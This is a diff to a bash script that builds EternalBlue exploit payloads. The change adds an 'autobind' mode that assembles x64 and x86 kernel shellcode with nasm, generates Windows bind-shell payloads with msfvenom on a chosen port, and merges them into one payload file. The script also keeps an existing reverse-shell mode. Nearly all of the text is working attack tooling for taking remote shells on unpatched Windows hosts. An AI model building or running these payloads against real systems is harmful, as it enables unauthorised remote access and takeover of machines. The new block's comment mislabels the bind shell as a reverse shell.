@@ -5,6 +5,7 @@ echo "Cleaning old builds..."
 echo ""
 
 auto=0
+autobind=0
 if ! [ -z "$1" ]; then
 	# Argument supplied
 	if [ "$1" == "auto" ]; then
@@ -15,7 +16,16 @@ if ! [ -z "$1" ]; then
 			echo "No LHOST given. Aborting!"
 			exit 3
 		fi
+	elif [ "$1" == "autobind" ]; then
+		echo "Running in automatic mode."
+		if [ -z "$2" ]; then
+			echo "No RPORT given. Aborting!"
+			exit 3
+		fi
+		echo "Will create a bind-shell-payload on $2."
+		autobind=1
 	fi
+
 fi
 
 DEFLPORTX86=444
@@ -58,7 +68,7 @@ echo "##########################################################################
 tput sgr0
 
 if [[ $auto -eq 1 ]]; then
-	# automatic mode
+	# automatic mode -reverseshell
 	sleep 5
 	echo Compiling x64 kernel shellcode
 	nasm -f bin eternalblue_kshellcode_x64.asm -o sc_x64_kernel.bin
@@ -72,7 +82,22 @@ if [[ $auto -eq 1 ]]; then
 	exit 0
 fi
 
-# Manual mode
+if [[ $autobind -eq 1 ]]; then
+	# automatic mode -reverseshell
+	sleep 5
+	echo Compiling x64 kernel shellcode
+	nasm -f bin eternalblue_kshellcode_x64.asm -o sc_x64_kernel.bin
+	nasm -f bin eternalblue_kshellcode_x86.asm -o sc_x86_kernel.bin
+	# Defaulting Payload to a basic bind-shell
+	msfvenom -a x64 -p windows/x64/shell_bind_tcp --platform windows -f raw -o sc_x64_msf.bin EXITFUNC=thread RPORT=$2
+	msfvenom -a x86 -p windows/shell_bind_tcp --platform windows -f raw -o sc_x86_msf.bin EXITFUNC=thread RPORT=$2
+	cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin
+	cat sc_x86_kernel.bin sc_x86_msf.bin > sc_x86.bin
+	python eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin
+	exit 0
+fi
+
+# Manual mode - Reverse
 echo "Do you wish to continue? (Y/n)"
 read conti
 if [[ $conti =~ [yY](es)* ]]; then
